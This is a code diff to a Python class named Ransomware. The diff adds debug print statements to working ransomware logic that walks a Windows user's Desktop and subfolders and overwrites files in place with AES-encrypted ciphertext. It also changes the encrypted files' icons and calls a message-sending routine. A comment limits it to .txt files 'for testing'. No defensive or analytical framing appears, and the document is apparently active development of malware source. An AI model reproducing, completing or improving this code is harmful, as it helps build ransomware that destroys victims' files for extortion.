@@ -117,12 +117,17 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
     def encryptFile(self, file):
         try:
             key = self.encryptionPass.encode()  # Convert encryption pass to bytes
+            print(f"Key (in bytes): {key}")
             cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()  # Create encryptor
+            print(f"Cipher: {cipher}")
             with open(file, 'rb') as infile:
                 plaintext = padding.PKCS7(128).padder().update(infile.read())  # Add padding to plaintext
+                print(f"Padding to plaintext: {plaintext}")
                 ciphertext = cipher.update(plaintext) + cipher.finalize()  # Encrypt plaintext
+                print(f"Encrypted plaintext: {ciphertext}")
             with open(file, "wb") as outfile:
                 outfile.write(ciphertext)
+                print(f"Outfile: {outfile}")
         
             # Change icon of encrypted file
             self.change_file_icon(file)
@@ -158,6 +163,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
 
     def run(self, userName):
         self.userName = userName
+        print(f"User name for directory: {self.userName}")
         print("Starting encryption process...")
         self.sendMessage()
 
@@ -165,6 +171,9 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         for root, directories, files in os.walk(f"C:\\Users\\{self.userName}\\Desktop"):
             for filename in files:
                 filepath = os.path.join(root, filename)
+                print(f"Filename of file to be encrypted: {filename}")
+                print(f"Root of file to be encrypted: {root}")
+                print(f"Filepath of file to be encrypted: {filepath}")
                 if filename.endswith('.txt'):  # Encrypt only text files for testing
                     threading.Thread(target=self.encryptFile, args=(filepath,)).start()
             
@@ -173,6 +182,9 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
                 for subdir_root, subdir_directories, subdir_files in os.walk(subdir_path):
                     for subdir_filename in subdir_files:
                         subdir_filepath = os.path.join(subdir_root, subdir_filename)
+                        print(f"Subdirectory filename of file to be encrypted: {subdir_filename}")
+                        print(f"Root of subdirectory file to be encrypted: {subdir_root}")
+                        print(f"Subdirectory filepath of file to be encrypted: {subdir_filepath}")
                         if subdir_filename.endswith('.txt'):  # Encrypt only text files for testing
                             threading.Thread(target=self.encryptFile, args=(subdir_filepath,)).start()
 
